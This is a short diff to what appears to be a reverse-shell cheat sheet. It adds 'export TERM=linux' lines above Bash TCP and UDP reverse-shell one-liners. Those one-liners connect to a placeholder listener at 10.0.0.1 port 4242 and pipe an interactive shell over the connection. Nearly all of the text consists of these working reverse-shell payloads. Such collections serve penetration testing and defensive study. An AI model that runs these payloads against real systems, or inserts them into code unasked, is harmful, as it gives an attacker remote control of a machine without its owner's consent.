@@ -50,6 +50,7 @@
 ### Bash TCP
 
 ```bash
+export TERM=linux
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
@@ -61,6 +62,7 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 ```bash
 Victim:
+export TERM=linux
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 
 Listener:
